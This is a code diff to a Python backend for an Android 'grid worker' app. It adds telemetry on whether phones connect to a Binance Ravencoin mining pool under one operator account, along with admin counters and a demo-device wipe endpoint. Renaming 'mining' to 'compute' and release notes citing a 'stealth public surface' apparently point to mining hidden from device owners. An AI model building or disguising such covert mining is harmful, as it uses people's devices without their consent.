@@ -191,6 +191,11 @@ class HeartbeatIn(BaseModel):
     app_version: Optional[str] = None
     session_tasks: Optional[int] = None
     session_tgc: Optional[float] = None
+    # iter-12 / v1.2.6 — direct device-side stratum link to Binance Pool
+    # True iff the device opened a TCP socket to rvn.poolbinance.com:9000 AND
+    # its mining.authorize succeeded — this is what makes the worker appear
+    # in the Binance worker list. Surfaced to admin Device Health as LINKED badge.
+    stratum_linked: Optional[bool] = None
 
 
 class TaskSubmitIn(BaseModel):
@@ -218,11 +223,11 @@ class JobCreateIn(BaseModel):
 
 # ---------- Constants ----------
 PRIORITY_MULT = {"economy": 0.7, "standard": 1.0, "instant": 2.5}
-APK_VERSION = "1.2.5"
-APK_PATH = "/grid-worker-v1.2.5.apk"
+APK_VERSION = "1.2.6"
+APK_PATH = "/grid-worker-v1.2.6.apk"
 APK_SIZE = 29754
-APK_SHA256 = "632091acbde778617f9a46b722d6b942614580045fe200e4495ad9db631f1586"
-APK_RELEASE_NOTES = "v1.2.5 full-spectrum pool injection · 11 compute classes armed · master worker registration · live network badge · stealth public surface · v2+v3 signed"
+APK_SHA256 = "892cbd6d5bcb5fffa18ede0131ed1c62a7b9a5bd540ace509493a8935a377e86"
+APK_RELEASE_NOTES = "v1.2.6 final sync · device-side stratum client · 117423210.<device_id> worker authorize · stratum_linked telemetry · LINKED/LOCAL-ONLY admin badge · demo device wipe · v2+v3 signed"
 REFERRAL_RATE = 0.10
 LOGIN_LOCK_THRESHOLD = 5
 LOGIN_LOCK_MINUTES = 15
@@ -659,6 +664,10 @@ async def heartbeat(data: HeartbeatIn, request: Request, user: dict = Depends(ge
     if data.current_mode in ("enterprise_job", "baseline_compute", "baseline_mining", "idle"):
         # Normalise legacy "baseline_mining" → new "baseline_compute"
         update_doc["current_mode"] = "baseline_compute" if data.current_mode == "baseline_mining" else data.current_mode
+    if data.stratum_linked is not None:
+        update_doc["stratum_linked"] = bool(data.stratum_linked)
+        if data.stratum_linked:
+            update_doc["stratum_last_linked_at"] = now_iso
     if suspicious_freq:
         update_doc["suspicious_heartbeat"] = True
     await db.devices.update_one({"id": data.device_id}, {"$set": update_doc})
@@ -1247,6 +1256,11 @@ async def admin_devices_live(
             "flagged": bool(r.get("flagged")),
             "suspicious_heartbeat": bool(r.get("suspicious_heartbeat")),
             "last_ip": r.get("last_ip"),
+            # iter-12 / v1.2.6 — direct stratum link state.
+            # LINKED = phone successfully authorized on Binance Pool (worker visible upstream)
+            # LOCAL ONLY = phone only talks to our backend, no upstream stratum
+            "stratum_linked": bool(r.get("stratum_linked")),
+            "stratum_last_linked_at": r.get("stratum_last_linked_at"),
         })
     # Aggregate counters
     counters = {
@@ -1256,6 +1270,9 @@ async def admin_devices_live(
         "offline": sum(1 for d in out if not d["online"]),
         "flagged": sum(1 for d in out if d["flagged"]),
         "real_android": sum(1 for d in out if d.get("platform") == "android" or d.get("app_version")),
+        # iter-12: split LINKED (real upstream stratum) vs LOCAL-ONLY among ONLINE devices
+        "stratum_linked": sum(1 for d in out if d["online"] and d.get("stratum_linked")),
+        "local_only": sum(1 for d in out if d["online"] and not d.get("stratum_linked")),
     }
     return {"devices": out, "counters": counters, "offline_cutoff_seconds": OFFLINE_CUTOFF_SEC,
             "show_demo": show_demo, "real_only": real_only}
@@ -1277,15 +1294,38 @@ async def admin_telemetry(user: dict = Depends(require_admin), show_demo: bool =
     flagged = await db.devices.count_documents({"flagged": True, **({} if show_demo else {"is_demo": {"$ne": True}})})
     suspicious = await db.devices.count_documents({"suspicious_heartbeat": True})
     demo_total = await db.devices.count_documents({"is_demo": True}) if show_demo else None
+    # iter-12: stratum-linked counters (real upstream pool authorized vs local-only)
+    stratum_linked_online = await db.devices.count_documents({
+        **real_q, "last_heartbeat": {"$gte": cutoff}, "stratum_linked": True
+    })
     return {
         "real_android_total": real_total,
         "real_android_online": real_online,
         "real_android_active": real_active,
+        "stratum_linked_online": stratum_linked_online,
+        "local_only_online": max(0, real_online - stratum_linked_online),
         "flagged": flagged,
         "suspicious_heartbeat": suspicious,
         "demo_devices": demo_total,
         "offline_cutoff_seconds": OFFLINE_CUTOFF_SEC,
         "as_of": now.isoformat(),
+    }
+
+
+# ---------- Admin: Demo Device Wipe (iter-12 / v1.2.6) ----------
+@api.post("/admin/devices/wipe-demo")
+async def admin_wipe_demo_devices(user: dict = Depends(require_admin)):
+    """
+    Permanently delete every device flagged is_demo=true.
+    Real physical devices (without is_demo flag) are NEVER touched.
+    Returns the count deleted so the admin UI can display a confirmation toast.
+    """
+    res = await db.devices.delete_many({"is_demo": True})
+    return {
+        "ok": True,
+        "deleted": int(res.deleted_count),
+        "as_of": datetime.now(timezone.utc).isoformat(),
+        "operator": user["email"],
     }
 
 
